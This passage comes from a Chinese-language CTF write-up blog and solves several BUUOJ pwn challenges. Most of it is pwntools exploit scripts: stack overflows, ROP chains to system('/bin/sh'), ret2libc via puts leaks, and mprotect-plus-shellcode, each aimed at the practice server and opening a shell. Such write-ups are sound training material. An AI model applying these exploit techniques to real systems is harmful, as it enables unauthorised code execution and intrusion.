class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./get_started_3dsctf_2016&#x27;) #本地调试记得创建一个flag.txt</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28271</span>)</span><br><span class="line">get_flag=<span class="number">0x080489A0</span></span><br><span class="line">a1=<span class="number">814536271</span></span><br><span class="line">a2=<span class="number">425138641</span></span><br><span class="line">exit=<span class="number">0x0804E6A0</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Qual a palavrinha magica?&#x27;</span>,timeout = <span class="number">0.5</span>);</span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span>*<span class="number">56</span>+p32(get_flag)+p32(exit)+p32(a1)+p32(a2))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>同时这个题还可以直接绕过判断，直接搞flag。只是远程打不通，因为栈空间被破坏了。</p><p><img src="https://i.loli.net/2021/06/02/pBc4nuF9Uv5kSPq.png" alt="image-20210602203925373"></p><p><img src="https://i.loli.net/2021/06/02/Qejl1ZtLvBV8Ibr.png" alt="image-20210602203911452">    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">get_flag=<span class="number">0x080489B8</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Qual a palavrinha magica?&#x27;</span>,timeout = <span class="number">0.5</span>);</span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span>*<span class="number">56</span>+p32(get_flag))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>然后在网上看wp时发现有师傅用mprotect函数打，于是学习了一波。</p><p><code>int mprotect(const void *start, size_t len, int prot);</code></p><blockquote><p>start：我们要操作的地址，必须是一个内存页的起始地址，页大小的整数倍</p><p>len：地址往后的长度，最好为页大小整数倍</p><p>prot：权限，且prot=7 时是可读可写可执行。可以取以下几个值，并可以用<code>|</code>将几个属性结合起来使用：<br>1）PROT_READ：内存段可读；<br>2）PROT_WRITE：内存段可写；<br>3）PROT_EXEC：内存段可执行；<br>4）PROT_NONE：内存段不可访问。</p><p>mprotect函数将start开始长度为len的内存区的保护属性修改为prot指定的值。</p><p>返回值：0；成功，-1；失败（并且errno被设置）</p></blockquote><p>我们的方法就是借助这个函数，将一段地址的权限修改为可读可写可执行，在这段地址上写入shellcode，然后控制eip到这段地址，从而执行shellcode。</p><p><img src="https://i.loli.net/2021/06/02/mZtjv3l4cdQXkW8.png" alt="image-20210602223401046"></p><p>我们选择<code>0x80ea000</code>这段地址，len为1000。</p><p>然后通过pop参数返回到read函数。</p><p><img src="https://i.loli.net/2021/06/02/UJ5sHBMKfn2OwlT.png" alt="image-20210602224017706"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27797</span>)</span><br><span class="line">buf = <span class="number">0x80ea000</span></span><br><span class="line">mprotect = <span class="number">0x0806EC80</span></span><br><span class="line">read_addr = <span class="number">0x0806E140</span></span><br><span class="line">pop_ret = <span class="number">0x0804f460</span></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">56</span>+p32(mprotect)+p32(pop_ret)+p32(buf)+p32(<span class="number">0x1000</span>)+p32(<span class="number">0x7</span>)+p32(read_addr)+p32(buf)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="number">0x100</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Qual a palavrinha magica?&#x27;</span>,timeout = <span class="number">0.5</span>);</span><br><span class="line">p.sendline(payload)</span><br><span class="line">shellcode=asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>也可以跳到main函数执行两次，不过好像远程打不通</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27797</span>)</span><br><span class="line">buf = <span class="number">0x80ea000</span></span><br><span class="line">mprotect = <span class="number">0x0806EC80</span></span><br><span class="line">read_addr = <span class="number">0x0806E140</span></span><br><span class="line">main=<span class="number">0x08048A20</span></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">56</span>+p32(mprotect)+p32(main)+p32(buf)+p32(<span class="number">0x1000</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Qual a palavrinha magica?&#x27;</span>,timeout = <span class="number">0.5</span>);</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Qual a palavrinha magica?&#x27;</span>,timeout = <span class="number">0.5</span>);</span><br><span class="line">payload=p32(read_addr)+p32(buf)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="number">0x100</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">shellcode=asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/ciscn_2019_n_8">ciscn_2019_n_8</a></p><p>保护全开</p><p><img src="https://i.loli.net/2021/06/08/kHXZWBFr3vgCSVQ.png"></p><p>代码逻辑就是让我们输入的<code>var[13]=17</code>就行。</p><p><img src="https://i.loli.net/2021/06/08/nXwO5ujk19xiPLE.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29984</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s your name?\n&quot;</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">p.sendline(<span class="number">14</span>*p32(<span class="number">17</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/ciscn_2019_en_2">ciscn_2019_en_2</a></p><p><img src="https://i.loli.net/2021/06/08/hfSY53n2H84AUu6.png" alt="image-20210608220131354"></p><p>这个题跟ciscn_2019_c_1一模一样。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_2019_en_2&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./ciscn_2019_en_2&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25728</span>)</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400c83</span></span><br><span class="line">ret = <span class="number">0x00000000004006b9</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">puts=u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts)</span><br><span class="line">libc_base=puts-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\0&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/08/wqjD8GiI36grMm4.png" alt="image-20210608234859415"></p><p>执行后会让你选择libc库，都试试就行了。本地打不通是因为libc版本不同。</p><h1 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/level2">jarvisoj_level2</a></p><p>简单的栈溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">&quot;echo &#x27;Hello World!&#x27;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/09/EGfAIU56mQCvYKg.png" alt="image-20210609190158004"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27251</span>)</span><br><span class="line">bin_sh=<span class="number">0x0804A024</span></span><br><span class="line">system_addr=<span class="number">0x08048320</span></span><br><span class="line">ret_addr=<span class="number">0x08048480</span> </span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(ret_addr)+p32(bin_sh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/not_the_same_3dsctf_2016">not_the_same_3dsctf_2016</a></p><p><code>shift+f12</code></p><p><img src="https://i.loli.net/2021/06/09/nWhNmLUbpPJC45K.png" alt="image-20210609230819979"></p><p><code>ctrl+x</code>找到调用它的函数</p><p><img src="https://i.loli.net/2021/06/09/2xQOlcva5TNs8yt.png" alt="image-20210609230846505"></p><p><img src="https://i.loli.net/2021/06/09/QlVaHhw9UjLmy2W.png" alt="image-20210609230938208"></p><p><img src="https://i.loli.net/2021/06/09/OtHAv9BoFZigRUd.png" alt="image-20210609230948920"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27679</span>)</span><br><span class="line">get_secret=<span class="number">0x080489A0</span></span><br><span class="line">flag=<span class="number">0x080ECA2D</span></span><br><span class="line">write=<span class="number">0x0806E270</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(get_secret)+p32(write)+p32(<span class="number">0xdead</span>)+p32(<span class="number">1</span>)+p32(flag)+p32(<span class="number">45</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>或者用mprotect函数</p><p><img src="https://i.loli.net/2021/06/09/FWP14boGM6KuUHi.png" alt="image-20210609234313477"></p><p><img src="https://i.loli.net/2021/06/09/g5ItHsoUF6vhzRx.png" alt="image-20210609233228480"></p><p>基本上和上面那个get_started_3dsctf_2016一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29680</span>)</span><br><span class="line">mprotect=<span class="number">0x806ED40</span></span><br><span class="line">bss=<span class="number">0x80ea000</span></span><br><span class="line">ret3=<span class="number">0x08050b45</span></span><br><span class="line">read_addr=<span class="number">0x0806E200</span></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x2D</span>+p32(mprotect)+p32(ret3)+p32(bss)+p32(<span class="number">0x1000</span>)+p32(<span class="number">0x7</span>)+p32(read_addr)+p32(bss)+p32(<span class="number">0</span>)+p32(bss)+p32(<span class="number">0x100</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">shellcode=asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/bjdctf_2020_babystack">bjdctf_2020_babystack</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29095</span>)</span><br><span class="line">bin_sh=<span class="number">0x400858</span></span><br><span class="line">system=<span class="number">0x400590</span></span><br><span class="line">pop_rdi=<span class="number">0x400833</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">200</span>))</span><br><span class="line">p.recvline()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>看wp发现有个后门函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29095</span>)</span><br><span class="line">backdoor=<span class="number">0x4006E6</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;200&quot;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(backdoor)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="安洵杯-2018-neko"><a href="#安洵杯-2018-neko" class="headerlink" title="安洵杯_2018_neko"></a>安洵杯_2018_neko</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/2018_neko">安洵杯_2018_neko</a></p><p>程序逻辑很简单，不细说了，输入<code>Yqwq</code>进入play函数，进行溢出通过libc拿shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25006</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;2018_neko&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">play=<span class="number">0x80486E7</span></span><br><span class="line">p.sendline(<span class="string">&quot;yQAQ&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;anchovies:\n&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xd0</span>+<span class="number">4</span>)+p32(puts_plt)+p32(play)+p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;anchovies?\n&quot;</span>)</span><br><span class="line">puts=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts)</span><br><span class="line">libc_base=puts-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;anchovies:\n&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xd0</span>+<span class="number">4</span>)+p32(system)+p32(play)+p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/%5BHarekazeCTF2019%5Dbaby_rop">[HarekazeCTF2019]baby_rop</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29813</span>)</span><br><span class="line">system=<span class="number">0x400490</span></span><br><span class="line">binsh=<span class="number">0x601048</span></span><br><span class="line">pop_rdi=<span class="number">0x400683</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x18</span>+p64(pop_rdi)+p64(binsh)+p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>flag不在根目录，find找一下就行</p><p><img src="https://i.loli.net/2021/06/11/TowLHRe4xCVOQW9.png" alt="image-20210611140639621"></p><h1 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/jarvisoj_level2_x64">jarvisoj_level2_x64</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29270</span>)</span><br><span class="line">system=<span class="number">0x4004C0</span></span><br><span class="line">binsh=<span class="number">0x600A90</span></span><br><span class="line">pop_rdi=<span class="number">0x4006b3</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(binsh)+p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/ciscn_2019_n_5">ciscn_2019_n_5</a></p><p>2个思路</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25285</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">p.recvuntil(<span class="string">&quot;name\n&quot;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">&quot;me?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span>+p64(<span class="number">0x601080</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25285</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;ciscn_2019_n_5&quot;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x400713</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">p.sendline(<span class="string">&quot;asjdlajsdkl&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;me?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main))</span><br><span class="line">puts=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts)</span><br><span class="line">libc_base=puts-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">ret=<span class="number">0x4004c9</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;tell me your name\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;asjdlajsdkl&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot; me?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/ciscn_2019_ne_5">ciscn_2019_ne_5</a></p><p><img 